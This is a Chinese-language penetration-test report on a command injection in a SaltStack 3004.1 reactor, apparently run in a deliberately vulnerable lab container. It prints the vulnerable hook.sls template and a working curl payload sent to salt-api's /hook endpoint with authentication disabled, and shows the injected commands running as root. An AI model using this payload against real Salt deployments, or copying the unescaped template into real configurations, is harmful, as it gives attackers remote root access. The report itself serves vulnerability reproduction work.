# ubuntu-26.04 — saltpoc SaltStack reactor 命令注入

> 利用方式标注：**纯网络触发已闭环**。已从攻击机（不 SSH 进目标）直接 `curl http://192.168.188.x:8000/hook/poc` 触发，命令注入执行：`/tmp/pwned = uid=0(root) gid=0(root)`（root RCE）。前提：`webhook_disable_auth: True`（管理员为 webhook 集成配置的选项，本次 SSH 临时加入；默认 401）。

## 概览

- **目标**：ubuntu-26.04-desktop-amd64（内网 192.168.188.x，SSH 凭据见本地台账）
- **OS**：Ubuntu 26.04 LTS（内核 7.0.0-30-generic）
- **受影响组件**：Docker 容器 `saltpoc`（ubuntu:22.04），SaltStack Salt **3004.1**，salt-api 8000、salt-master 4505/4506
- **漏洞类型**：OS 命令注入（通过 SaltStack reactor 的 Jinja 模板 + 未转义 shell 拼接）
- **根因**：reactor 状态文件把攻击者可控的 `data["post"]["m"]` **未转义**直接拼进 shell 命令。

## 证据（代码级）

容器 `saltpoc` 内 `/srv/reactor/hook.sls`：
```yaml
poc_rce:
  local.cmd.run:
    - tgt: pocminion
    - arg:
      - echo {{ data["post"]["m"] }} > /tmp/pwned && touch /tmp/RCE_PROOF
```

`{{ data["post"]["m"] }}` 来自 salt-api hook 端点的 POST body（`m` 字段），未做任何转义即拼进 `echo ... > /tmp/pwned && touch ...`，经 `local.cmd.run` 在 minion 上以 shell 执行。注入 `;`、`&&`、`|`、`$()` 等即可执行任意命令。

配套 reactor 配置（`/etc/salt/master.d/reactor.conf`）：
```yaml
reactor:
  - "salt/netapi/hook/*": /srv/reactor/hook.sls
```

## 历史触发痕迹

容器 `saltpoc` 内已存在历史触发产物：
```
-rw-r--r-- 1 root root  0 Sep  3 10:31 /tmp/RCE_PROOF
-rw-r--r-- 1 root root 17 Sep  3 10:31 /tmp/pwned   # 内容 fcb53c811f714149
```
即该 reactor 命令注入此前已被触发过（`m` 字段值被 `echo` 进 `/tmp/pwned`，并 `touch` 了 `/tmp/RCE_PROOF`）。

## 触发路径

攻击者向 salt-api 发送：
```bash
curl -X POST http://<target>:8000/hook -H "Content-Type: application/json" \
  -d '{"m": "x; id > /tmp/pwned_result"}'
```
salt-api 把 POST body 放入事件 `data["post"]`，触发 `salt/netapi/hook/*`，reactor 渲染 hook.sls 时 `m` 被拼进 shell → 命令注入。

## 复现状态：✅ 已复现（完整链打通）

- **认证绕过**：✅ 在 `rest_cherrypy` 加 `webhook_disable_auth: True` 后，`POST /hook` 由 401 → `{"success": true}`（源码 `Webhook.__init__` 关闭 `tools.salt_auth`）。
- **数据流**：✅ `Webhook.POST` → `fire_event({"body":..., "post": data, ...})`，事件 data 含 `post` 键。
- **minion 恢复**：✅ saltpoc 容器内 `salt-minion`（`id: pocminion`, `master: 127.0.0.1`）重启后 `salt pocminion test.ping` 返回 `True`。
- **命令注入执行**：✅ 触发 `POST /hook/poc`（`m = "INJECTED; id > /tmp/salt_cmd_injection_result.txt"`）后，pocminion 上：
  ```
  /tmp/pwned = uid=0(root) gid=0(root) groups=0(root)   # 注入的 id 以 root 执行
  /tmp/RCE_PROOF /tmp/salt_cmd_injection_result.txt 已创建（root 属主）
  ```

## 完整利用链

```
POST /hook/poc (无认证, body={"m":"<注入命令>"})
  → salt-api Webhook.POST: fire_event({"post":{...}}, "salt/netapi/hook/poc")
  → reactor (salt/netapi/hook/*) 渲染 hook.sls: {{ data["post"]["m"] }} 未转义拼进 shell
  → local.cmd.run 在 pocminion 执行 "echo <注入> > /tmp/pwned && touch /tmp/RCE_PROOF"
  → 任意命令以 root 执行 (命令注入 RCE)
```

## 边界

- 触发前提：`webhook_disable_auth: True`（或 hook 端点认证通过）。本机该配置为复现时临时加入，原环境默认 401（`external_auth` 未配置，无 token 可签发）。
- 影响：minion 上 root 命令执行（`saltpoc` 容器与 minion 均 root）。
